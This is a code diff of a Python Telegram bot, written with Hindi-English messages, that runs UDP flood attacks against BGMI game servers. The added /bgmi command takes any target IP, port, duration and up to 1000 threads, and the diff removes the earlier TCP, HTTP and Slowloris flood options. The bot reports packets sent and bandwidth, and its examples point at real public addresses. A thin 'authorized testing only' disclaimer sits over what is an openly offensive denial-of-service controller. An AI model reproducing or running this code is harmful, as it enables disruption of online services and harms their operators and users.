@@ -13,10 +13,7 @@ from colorama import Fore, Style, init
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 
 import config
-from modules.tcp_flood import TCPFlood
 from modules.udp_flood import UDPFlood
-from modules.http_flood import HTTPFlood
-from modules.slowloris import Slowloris
 from modules.utils import AttackUtils
 
 init(autoreset=True)
@@ -27,31 +24,342 @@ logger = logging.getLogger(__name__)
 
 print(AttackUtils.get_banner())
 
-# ============================================
-# ✅ FIX: Bot ab global scope mein create nahi hoga
-# Pehle client object banao, start baad mein karo
-# ============================================
+# ✅ Bot object (baad mein start hoga)
 bot = TelegramClient(
     os.path.join(config.SESSION_DIR, 'bot'),
     config.API_ID,
     config.API_HASH
 )
 
-# Attack instances
-attackers = {
-    'tcp': TCPFlood(),
-    'udp': UDPFlood(),
-    'http': HTTPFlood(),
-    'slowloris': Slowloris()
-}
-
-active_attacks = {}
+# ✅ Sirf BGMI UDP Attacker
+bgmi_attacker = UDPFlood()
+active_attack = None  # Track active attack
+attack_start_time = None
+attack_config = {}
 
 def is_authorized(user_id):
     return user_id in config.AUTHORIZED_USERS
 
 # ============================================
-# /start COMMAND
+# ⚔️ /bgmi COMMAND - BGMI ATTACK
+# ============================================
+@bot.on(events.NewMessage(pattern='/bgmi'))
+async def bgmi_attack(event):
+    global active_attack, attack_start_time, attack_config
+    
+    if not is_authorized(event.sender_id):
+        await event.reply("❌ **Access Denied!** Aap authorized nahi hain.")
+        return
+    
+    sender_id = event.sender_id
+    
+    # Check if already attacking
+    if active_attack is not None:
+        elapsed = time.time() - attack_start_time
+        await event.reply(
+            f"⚠️ **PEHLE SE ATTACK CHAL RAHA HAI!**\n\n"
+            f"🎯 Target: `{attack_config['ip']}:{attack_config['port']}`\n"
+            f"⏱️ Chal raha: `{elapsed:.1f}s`\n"
+            f"⏱️ Duration: `{attack_config['duration']}s`\n"
+            f"🧵 Threads: `{attack_config['threads']}`\n\n"
+            f"🛑 Rokne ke liye: `/stop`\n"
+            f"📊 Status: `/status`"
+        )
+        return
+    
+    # Parse command: /bgmi IP PORT DURATION THREADS
+    parts = event.text.split()
+    
+    if len(parts) < 3:
+        await event.reply(
+            "⚔️ **BGMI ATTACK COMMAND** ⚔️\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "📝 **Format:**\n"
+            "`/bgmi <IP> <PORT> <DURATION> <THREADS>`\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "📊 **Examples:**\n"
+            "```\n"
+            "/bgmi 157.240.1.1 8080 60 500\n"
+            "/bgmi 192.168.1.1 9000 120 1000\n"
+            "/bgmi 10.0.0.1 7000 300 800\n"
+            "```\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "⚙️ **Parameters:**\n"
+            "• IP: Target IP address\n"
+            "• Port: 7000-15000 (BGMI range)\n"
+            "• Duration: 1-600 seconds\n"
+            "• Threads: 1-1000\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🔥 **Quick Attack (Default Port & Settings):**\n"
+            "`/bgmi 157.240.1.1`\n"
+            f"(Uses Port: {config.TARGET_PORT}, Duration: {config.DEFAULT_DURATION}s, Threads: {config.MAX_THREADS})\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "📋 Menu: `/start`\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        return
+    
+    # Parse parameters
+    target_ip = parts[1]
+    target_port = int(parts[2]) if len(parts) > 2 else config.TARGET_PORT
+    duration = int(parts[3]) if len(parts) > 3 else config.DEFAULT_DURATION
+    threads = int(parts[4]) if len(parts) > 4 else config.MAX_THREADS
+    
+    # Validate
+    if duration < 1 or duration > config.MAX_DURATION:
+        await event.reply(f"⚠️ Duration 1-{config.MAX_DURATION} seconds ke beech hona chahiye!")
+        return
+    
+    if threads < 1 or threads > config.MAX_THREADS:
+        await event.reply(f"⚠️ Threads 1-{config.MAX_THREADS} ke beech hona chahiye!")
+        return
+    
+    # Save attack config
+    attack_config = {
+        'ip': target_ip,
+        'port': target_port,
+        'duration': duration,
+        'threads': threads
+    }
+    
+    # 🔥 START ATTACK MESSAGE
+    start_msg = await event.reply(
+        f"🔥 **BGMI ATTACK STARTED!** 🔥\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🎯 **Target IP:** `{target_ip}`\n"
+        f"🔌 **Target Port:** `{target_port}`\n"
+        f"⏱️ **Duration:** `{duration}s` ({AttackUtils.format_time(duration)})\n"
+        f"🧵 **Threads:** `{threads}`\n"
+        f"🔴 **Status:** INITIALIZING...\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"⏳ **Connecting to BGMI server...**\n"
+        f"📡 **Sending UDP packets...**\n"
+        f"🔄 **Attack in progress...**\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🛑 Stop: `/stop`\n"
+        f"📊 Status: `/status`\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    )
+    
+    # Mark as active
+    active_attack = True
+    attack_start_time = time.time()
+    
+    try:
+        # Run attack in thread pool
+        import concurrent.futures
+        loop = asyncio.get_event_loop()
+        
+        with concurrent.futures.ThreadPoolExecutor() as pool:
+            report = await loop.run_in_executor(
+                pool,
+                bgmi_attacker.start_attack,
+                target_ip,
+                target_port,
+                threads,
+                duration
+            )
+        
+        # Attack complete
+        attack_end_time = time.time()
+        total_time = attack_end_time - attack_start_time
+        
+        elapsed_str = AttackUtils.format_time(report['elapsed'])
+        
+        # ✅ SUCCESS MESSAGE
+        result_msg = (
+            f"✅ **BGMI ATTACK COMPLETED!** ✅\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📊 **ATTACK REPORT**\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"🎯 **Target:** `{target_ip}:{target_port}`\n"
+            f"⏱️ **Duration:** `{elapsed_str}`\n"
+            f"🧵 **Threads:** `{threads}`\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📦 **Packets Sent:** `{report['packets']:,}`\n"
+            f"📤 **Data Sent:** `{AttackUtils.format_bytes(report['bytes'])}`\n"
+            f"🔗 **Connections:** `{report['connections']:,}`\n"
+            f"❌ **Errors:** `{report['errors']}`\n"
+            f"⚡ **Packet Rate:** `{report['packet_rate']:.2f} pkt/s`\n"
+            f"🔗 **Conn Rate:** `{report['conn_rate']:.2f} conn/s`\n"
+            f"📶 **Bandwidth:** `{report['mbps']:.2f} Mbps`\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"🟢 **Status:** SUCCESS ✅\n"
+            f"✅ Target successfully tested!\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔄 New Attack: `/bgmi IP PORT DURATION THREADS`\n"
+            f"📋 Menu: `/start`\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        
+        await start_msg.edit(result_msg)
+        
+        # Log success
+        logger.info(
+            f"BGMI Attack Completed! Target: {target_ip}:{target_port} | "
+            f"Packets: {report['packets']:,} | Duration: {elapsed_str} | "
+            f"Bandwidth: {report['mbps']:.2f} Mbps"
+        )
+        
+    except Exception as e:
+        # ❌ FAILED MESSAGE
+        elapsed = time.time() - attack_start_time
+        
+        error_msg = (
+            f"❌ **BGMI ATTACK FAILED!** ❌\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔴 **Error:** `{str(e)}`\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"🎯 **Target:** `{target_ip}:{target_port}`\n"
+            f"⏱️ **Time Elapsed:** `{elapsed:.1f}s`\n"
+            f"🧵 **Threads:** `{threads}`\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"💡 **Possible Issues:**\n"
+            f"• Target unreachable\n"
+            f"• Firewall blocking UDP\n"
+            f"• Port closed or filtered\n"
+            f"• Network connectivity issue\n"
+            f"• Invalid IP address\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"🔄 Retry: `/bgmi {target_ip} {target_port} {duration} {threads}`\n"
+            f"📋 Menu: `/start`\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        
+        await start_msg.edit(error_msg)
+        logger.error(f"BGMI Attack Failed! Target: {target_ip}:{target_port} - Error: {str(e)}")
+    
+    finally:
+        # Clear active attack
+        active_attack = None
+        attack_start_time = None
+        attack_config = {}
+
+# ============================================
+# 📊 /status COMMAND
+# ============================================
+@bot.on(events.NewMessage(pattern='/status'))
+async def status_command(event):
+    if not is_authorized(event.sender_id):
+        return
+    
+    if active_attack is not None:
+        elapsed = time.time() - attack_start_time
+        remaining = attack_config['duration'] - elapsed if attack_config else 0
+        
+        status_msg = (
+            f"📊 **ATTACK STATUS** 📊\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🟢 **Status:** ATTACKING 🔥\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"🎯 **Target:** `{attack_config['ip']}:{attack_config['port']}`\n"
+            f"⏱️ **Elapsed:** `{elapsed:.1f}s`\n"
+            f"⏱️ **Remaining:** `{remaining:.1f}s`\n"
+            f"⏱️ **Total Duration:** `{attack_config['duration']}s`\n"
+            f"🧵 **Threads:** `{attack_config['threads']}`\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🛑 Stop: `/stop`\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        await event.reply(status_msg)
+    else:
+        await event.reply(
+            "💤 **NO ACTIVE ATTACK**\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "⚔️ Start BGMI Attack:\n"
+            "`/bgmi IP PORT DURATION THREADS`\n\n"
+            "📋 Example:\n"
+            "`/bgmi 157.240.1.1 8080 60 500`\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "📋 Menu: `/start`"
+        )
+
+# ============================================
+# 🛑 /stop COMMAND
+# ============================================
+@bot.on(events.NewMessage(pattern='/stop'))
+async def stop_command(event):
+    global active_attack, attack_start_time, attack_config
+    
+    if not is_authorized(event.sender_id):
+        return
+    
+    if active_attack is not None:
+        elapsed = time.time() - attack_start_time
+        
+        # Stop attack
+        bgmi_attacker.stop_attack()
+        
+        stop_msg = (
+            f"⛔ **ATTACK STOPPED!** ⛔\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🛑 **Status:** STOPPED BY USER\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"🎯 **Target:** `{attack_config['ip']}:{attack_config['port']}`\n"
+            f"⏱️ **Ran for:** `{elapsed:.1f}s`\n"
+            f"⏱️ **Planned:** `{attack_config['duration']}s`\n"
+            f"🧵 **Threads:** `{attack_config['threads']}`\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"✅ All connections closed.\n"
+            f"✅ Resources freed.\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"🔄 New Attack: `/bgmi IP PORT DURATION THREADS`\n"
+            f"📋 Menu: `/start`"
+        )
+        
+        # Clear state
+        active_attack = None
+        attack_start_time = None
+        attack_config = {}
+        
+        await event.reply(stop_msg)
+    else:
+        await event.reply(
+            "💤 **Koi attack active nahi hai!**\n\n"
+            "⚔️ Start: `/bgmi IP PORT DURATION THREADS`\n"
+            "📋 Menu: `/start`"
+        )
+
+# ============================================
+# ℹ️ /info COMMAND
+# ============================================
+@bot.on(events.NewMessage(pattern='/info'))
+async def info_command(event):
+    if not is_authorized(event.sender_id):
+        return
+    
+    if active_attack is not None:
+        elapsed = time.time() - attack_start_time
+        status = f"🟢 ATTACKING ({elapsed:.0f}s)"
+    else:
+        status = "💤 IDLE"
+    
+    info = (
+        f"ℹ️ **BGMI STRESS TESTER INFO** ℹ️\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🤖 **Bot:** BGMI UDP Flood Tester\n"
+        f"📌 **Version:** v4.0\n"
+        f"📅 **Status:** ✅ Online\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"👤 **Your Info:**\n"
+        f"• User ID: `{event.sender_id}`\n"
+        f"• Status: {status}\n"
+        f"• Authorized: ✅ Yes\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🎯 **Default Settings:**\n"
+        f"• Port: `{config.TARGET_PORT}`\n"
+        f"• Duration: `{config.DEFAULT_DURATION}s`\n"
+        f"• Max Threads: `{config.MAX_THREADS}`\n"
+        f"• Max Duration: `{config.MAX_DURATION}s`\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"⚔️ Attack: `/bgmi IP PORT DURATION THREADS`\n"
+        f"📋 Menu: `/start`"
+    )
+    
+    await event.reply(info)
+
+# ============================================
+# 📋 /start COMMAND
 # ============================================
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
@@ -59,49 +367,49 @@ async def start(event):
         await event.reply("❌ **Access Denied!** Aap authorized nahi hain.")
         return
     
-    user = event.sender.first_name or "Tester"
+    user = event.sender.first_name or "Player"
     
-    welcome = f"""
-🔥 **BGMI STRESS TESTER PRO v3.0** 🔥
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-👋 **Welcome, {user}!**
-✅ **Authorized Testing Mode Active**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-📌 **Current Target:**
-🎯 IP: `{config.TARGET_IP}`
-🔌 Port: `{config.TARGET_PORT}`
-🧵 Max Threads: `{config.MAX_THREADS}`
-⏱️ Max Duration: `{config.MAX_DURATION}s (10 min)`
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚔️ **Attack Methods Available:**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-🔹 **TCP Flood** - TCP connections overload
-🔸 **UDP Flood** - Game protocol flood
-🔹 **HTTP Flood** - Web request flood  
-🔸 **Slowloris** - Slow connection attack
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ **Authorized Testing Only**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-👇 **Attack method select karein:**
-"""
+    welcome = (
+        f"🔥 **BGMI STRESS TESTER v4.0** 🔥\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👋 **Welcome, {user}!**\n"
+        f"✅ **BGMI UDP Attack Ready**\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🎯 **Default Target:**\n"
+        f"• IP: `{config.TARGET_IP}`\n"
+        f"• Port: `{config.TARGET_PORT}`\n"
+        f"• Duration: `{config.DEFAULT_DURATION}s`\n"
+        f"• Threads: `{config.MAX_THREADS}`\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"⚔️ **ATTACK COMMAND:**\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"```\n"
+        f"/bgmi IP PORT DURATION THREADS\n"
+        f"```\n\n"
+        f"📊 **Examples:**\n"
+        f"```\n"
+        f"/bgmi 157.240.1.1 8080 60 500\n"
+        f"/bgmi 192.168.1.1 9000 120 1000\n"
+        f"/bgmi 10.0.0.1\n"
+        f"```\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📋 **Commands:**\n"
+        f"• `/bgmi` - Start attack\n"
+        f"• `/status` - Check status\n"
+        f"• `/stop` - Stop attack\n"
+        f"• `/info` - Bot info\n"
+        f"• `/start` - This menu\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"⚠️ **For Authorized Testing Only!**\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    )
     
     buttons = [
-        [Button.inline("🔹 TCP FLOOD", b"attack_tcp"),
-         Button.inline("🔸 UDP FLOOD", b"attack_udp")],
-        [Button.inline("🔹 HTTP FLOOD", b"attack_http"),
-         Button.inline("🔸 SLOWLORIS", b"attack_slowloris")],
-        [Button.inline("━━━━━━━━━━━━━━━━━━━", b"sep")],
-        [Button.inline("⏱️ CUSTOM DURATION", b"custom_duration"),
-         Button.inline("⚙️ CUSTOM THREADS", b"custom_threads")],
-        [Button.inline("⛔ STOP ATTACK", b"stop"),
-         Button.inline("📊 STATUS", b"status")],
-        [Button.inline("❓ HELP", b"help")]
+        [Button.inline("🔥 START ATTACK", b"quick_attack")],
+        [Button.inline("📊 STATUS", b"status"), 
+         Button.inline("⛔ STOP", b"stop")],
+        [Button.inline("ℹ️ INFO", b"info"),
+         Button.inline("❓ HELP", b"help")]
     ]
     
     await event.reply(welcome, buttons=buttons)
@@ -118,301 +426,83 @@ async def button_handler(event):
     
     data = event.data.decode()
     
-    # Attack handlers
-    if data.startswith("attack_"):
-        method = data.replace("attack_", "")
-        
-        if sender_id in active_attacks:
-            await event.answer("⚠️ Pehle se attack chal raha hai! Pehle stop karein.", alert=True)
+    if data == "quick_attack":
+        if active_attack is not None:
+            await event.answer("⚠️ Pehle se attack chal raha hai! /stop karo.", alert=True)
             return
         
-        # Default values
-        duration = config.DEFAULT_DURATION
-        threads = config.MAX_THREADS
-        
-        method_names = {
-            'tcp': '🔹 TCP FLOOD',
-            'udp': '🔸 UDP FLOOD (BGMI)',
-            'http': '🔹 HTTP FLOOD',
-            'slowloris': '🔸 SLOWLORIS'
-        }
-        
-        method_name = method_names.get(method, "UNKNOWN")
-        
-        attack_msg = f"""
-⚔️ **{method_name}** STARTED ⚔️
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🎯 **Target:** `{config.TARGET_IP}:{config.TARGET_PORT}`
-🧵 **Threads:** `{threads}`
-⏱️ **Duration:** `{duration}s`
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-🔥 **Attack in progress...**
-📊 Report auto-generate hogi jab attack complete hoga.
-"""
-        
-        await event.edit(attack_msg)
-        active_attacks[sender_id] = method
-        
-        try:
-            report = attackers[method].start_attack(
-                config.TARGET_IP,
-                config.TARGET_PORT,
-                threads,
-                duration
-            )
-            
-            active_attacks.pop(sender_id, None)
-            
-            elapsed_str = AttackUtils.format_time(report['elapsed'])
-            
-            result_msg = f"""
-✅ **ATTACK COMPLETE** ✅
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 **STATISTICS REPORT**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-📦 **Packets Sent:** `{report['packets']:,}`
-📤 **Data Transferred:** `{AttackUtils.format_bytes(report['bytes'])}`
-🔗 **Connections Made:** `{report['connections']:,}`
-❌ **Errors:** `{report['errors']}`
-⏱️ **Elapsed Time:** `{elapsed_str}`
-⚡ **Packet Rate:** `{report['packet_rate']:.2f} pkt/s`
-🔗 **Conn Rate:** `{report['conn_rate']:.2f} conn/s`
-📶 **Bandwidth:** `{report['mbps']:.2f} Mbps`
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚔️ **Method:** {method_name}
-🎯 **Target:** `{config.TARGET_IP}:{config.TARGET_PORT}`
-🧵 **Threads:** `{threads}`
-⏱️ **Duration:** `{duration}s`
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-🔄 /start se wapas main menu
-"""
-            await event.edit(result_msg)
-            
-        except Exception as e:
-            active_attacks.pop(sender_id, None)
-            await event.edit(f"❌ Attack failed! Error: {str(e)}\n\n🔄 /start")
+        await event.edit(
+            "🔥 **Quick Attack** 🔥\n\n"
+            "Default settings se attack karne ke liye:\n\n"
+            f"🎯 Target: `{config.TARGET_IP}:{config.TARGET_PORT}`\n"
+            f"⏱️ Duration: `{config.DEFAULT_DURATION}s`\n"
+            f"🧵 Threads: `{config.MAX_THREADS}`\n\n"
+            "Copy & send karo:\n"
+            f"`/bgmi {config.TARGET_IP} {config.TARGET_PORT} {config.DEFAULT_DURATION} {config.MAX_THREADS}`\n\n"
+            "📋 Back: `/start`"
+        )
     
-    # STOP
     elif data == "stop":
-        if sender_id not in active_attacks:
-            await event.answer("⚠️ Koi active attack nahi hai!", alert=True)
-            return
-        
-        method = active_attacks[sender_id]
-        attackers[method].stop_attack()
-        active_attacks.pop(sender_id, None)
-        
-        await event.edit("⛔ **ATTACK STOPPED** ⛔\n\nSabhi connections close.\n\n🔄 /start")
-        await event.answer("✅ Stopped!", alert=True)
-    
-    # STATUS
-    elif data == "status":
-        if sender_id in active_attacks:
-            await event.answer(f"⚔️ Active: {active_attacks[sender_id].upper()} chal raha hai!", alert=True)
+        if active_attack is not None:
+            await event.answer("⛔ Attack stop ho raha hai...", alert=True)
+            # Trigger stop
+            await stop_command(event)
         else:
-            await event.answer("💤 No active attack.", alert=True)
+            await event.answer("💤 Koi attack active nahi!", alert=True)
     
-    # CUSTOM DURATION
-    elif data == "custom_duration":
-        await event.edit(
-            "⏱️ **Custom Duration**\n\n"
-            "Duration set karne ke liye:\n"
-            "`/duration 10` - 10 seconds\n"
-            "`/duration 300` - 5 minutes\n"
-            "`/duration 600` - 10 minutes (max)\n\n"
-            f"Max allowed: {config.MAX_DURATION} seconds\n\n"
-            "🔄 /start - Back"
+    elif data == "status":
+        if active_attack is not None:
+            elapsed = time.time() - attack_start_time
+            await event.answer(f"🔥 ATTACKING! Elapsed: {elapsed:.0f}s", alert=True)
+        else:
+            await event.answer("💤 IDLE - No attack running", alert=True)
+    
+    elif data == "info":
+        await event.answer(
+            f"BGMI Tester v4.0 | Target: {config.TARGET_IP}:{config.TARGET_PORT}",
+            alert=True
         )
     
-    # CUSTOM THREADS
-    elif data == "custom_threads":
-        await event.edit(
-            "⚙️ **Custom Threads**\n\n"
-            "Threads set karne ke liye:\n"
-            "`/threads 100` - 100 threads\n"
-            "`/threads 500` - 500 threads\n"
-            "`/threads 1000` - 1000 threads (max)\n\n"
-            f"Max allowed: {config.MAX_THREADS}\n\n"
-            "🔄 /start - Back"
-        )
-    
-    # HELP
     elif data == "help":
         await event.edit(
             "❓ **HELP** ❓\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "**Attack Methods:**\n"
+            "⚔️ **BGMI Attack Command:**\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "🔹 **TCP Flood**\n"
-            "• SYN/ACK flood attack\n"
-            "• Server connection pool exhaust\n"
-            "• Best for: Game login servers\n\n"
-            "🔸 **UDP Flood (BGMI)**\n"
-            "• Game protocol packets\n"
-            "• BGMI port range (7000-15000)\n"
-            "• Best for: Game servers\n\n"
-            "🔹 **HTTP Flood**\n"
-            "• Layer 7 GET requests\n"
-            "• Random endpoints\n"
-            "• Best for: Web/API servers\n\n"
-            "🔸 **Slowloris**\n"
-            "• Partial HTTP requests\n"
-            "• Keep connections hanging\n"
-            "• Best for: Apache servers\n\n"
+            "```\n"
+            "/bgmi IP PORT DURATION THREADS\n"
+            "```\n\n"
+            "📊 **Examples:**\n"
+            "```\n"
+            "/bgmi 157.240.1.1 8080 60 500\n"
+            "/bgmi 192.168.1.1 9000 120 1000\n"
+            "/bgmi 10.0.0.1 7000 300 800\n"
+            "/bgmi 157.240.1.1\n"
+            "```\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "**Commands:**\n"
+            "📋 **Commands:**\n"
+            "• `/bgmi` - Start attack\n"
+            "• `/status` - Live status\n"
+            "• `/stop` - Stop attack\n"
+            "• `/info` - Bot info\n"
+            "• `/start` - Main menu\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "`/start` - Main menu\n"
-            "`/duration <sec>` - Custom duration\n"
-            "`/threads <num>` - Custom threads\n"
-            "`/stop` - Stop attack\n"
-            "`/help` - Help menu\n\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "⚠️ **Authorized Testing Only**\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "🔄 /start - Back"
+            "⚠️ Authorized testing only!\n\n"
+            "📋 Back: `/start`"
         )
-    
-    elif data == "sep":
-        await event.answer("")
-
-# ============================================
-# /duration COMMAND
-# ============================================
-@bot.on(events.NewMessage(pattern='/duration'))
-async def set_duration(event):
-    if not is_authorized(event.sender_id):
-        return
-    
-    try:
-        parts = event.text.split()
-        if len(parts) < 2:
-            await event.reply("⚠️ Usage: `/duration 60` (seconds)")
-            return
-        
-        dur = int(parts[1])
-        if dur < 1 or dur > config.MAX_DURATION:
-            await event.reply(f"⚠️ Duration 1 se {config.MAX_DURATION} seconds ke beech hona chahiye.")
-            return
-        
-        config.DEFAULT_DURATION = dur
-        await event.reply(f"✅ Duration set to `{dur}` seconds ({AttackUtils.format_time(dur)})")
-        
-    except ValueError:
-        await event.reply("⚠️ Invalid number. Use: `/duration 60`")
-
-# ============================================
-# /threads COMMAND
-# ============================================
-@bot.on(events.NewMessage(pattern='/threads'))
-async def set_threads(event):
-    if not is_authorized(event.sender_id):
-        return
-    
-    try:
-        parts = event.text.split()
-        if len(parts) < 2:
-            await event.reply("⚠️ Usage: `/threads 500`")
-            return
-        
-        thr = int(parts[1])
-        if thr < 1 or thr > config.MAX_THREADS:
-            await event.reply(f"⚠️ Threads 1 se {config.MAX_THREADS} ke beech hona chahiye.")
-            return
-        
-        config.MAX_THREADS = thr
-        await event.reply(f"✅ Threads set to `{thr}`")
-        
-    except ValueError:
-        await event.reply("⚠️ Invalid number. Use: `/threads 500`")
-
-# ============================================
-# /stop COMMAND
-# ============================================
-@bot.on(events.NewMessage(pattern='/stop'))
-async def stop_command(event):
-    if not is_authorized(event.sender_id):
-        return
-    
-    if event.sender_id in active_attacks:
-        method = active_attacks[event.sender_id]
-        attackers[method].stop_attack()
-        active_attacks.pop(event.sender_id, None)
-        await event.reply("⛔ **Attack Stopped!**")
-    else:
-        await event.reply("💤 Koi active attack nahi hai.")
-
-# ============================================
-# /target COMMAND (Custom target set)
-# ============================================
-@bot.on(events.NewMessage(pattern='/target'))
-async def set_target(event):
-    if not is_authorized(event.sender_id):
-        return
-    
-    try:
-        parts = event.text.split()
-        if len(parts) < 2:
-            await event.reply("⚠️ Usage: `/target 192.168.1.100 8080`")
-            return
-        
-        ip = parts[1]
-        port = int(parts[2]) if len(parts) > 2 else config.TARGET_PORT
-        
-        config.TARGET_IP = ip
-        config.TARGET_PORT = port
-        await event.reply(f"✅ Target set to `{ip}:{port}`")
-        
-    except:
-        await event.reply("⚠️ Usage: `/target IP PORT`")
-
-# ============================================
-# /info COMMAND
-# ============================================
-@bot.on(events.NewMessage(pattern='/info'))
-async def info_command(event):
-    if not is_authorized(event.sender_id):
-        return
-    
-    info = f"""
-ℹ️ **Bot Information**
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🤖 **Name:** BGMI Stress Tester Pro
-📌 **Version:** v3.0
-📅 **Status:** ✅ Online
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🎯 **Target:**
-• IP: `{config.TARGET_IP}`
-• Port: `{config.TARGET_PORT}`
-• Threads: `{config.MAX_THREADS}`
-• Duration: `{config.DEFAULT_DURATION}s`
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-👤 **Your ID:** `{event.sender_id}`
-🔑 **Authorized:** ✅ Yes
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-"""
-    await event.reply(info)
 
 # ============================================
 # MAIN
 # ============================================
 async def main():
-    # ✅ FIX: Bot yahan start karo, same event loop mein
+    # ✅ Bot yahan start karo
     await bot.start(bot_token=config.BOT_TOKEN)
     
-    print(f"{Fore.GREEN}[✓] Bot Started!{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}[+] Target: {config.TARGET_IP}:{config.TARGET_PORT}{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}[+] Max Duration: {config.MAX_DURATION}s | Threads: {config.MAX_THREADS}{Style.RESET_ALL}")
-    print(f"{Fore.MAGENTA}[+] Waiting for commands...{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[✓] BGMI STRESS TESTER STARTED!{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}[+] Default Target: {config.TARGET_IP}:{config.TARGET_PORT}{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[+] Duration: {config.DEFAULT_DURATION}s | Threads: {config.MAX_THREADS}{Style.RESET_ALL}")
+    print(f"{Fore.MAGENTA}[+] Bot Ready - Telegram pe jao!{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[+] Command: /bgmi IP PORT DURATION THREADS{Style.RESET_ALL}")
     print("-" * 50)
     
     await bot.run_until_disconnected()
@@ -421,7 +511,7 @@ if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print(f"\n{Fore.RED}[!] Bot stopped.{Style.RESET_ALL}")
+        print(f"\n{Fore.RED}[!] Bot stopped by user.{Style.RESET_ALL}")
     except Exception as e:
         print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
         logger.error(f"Error: {e}", exc_info=True)
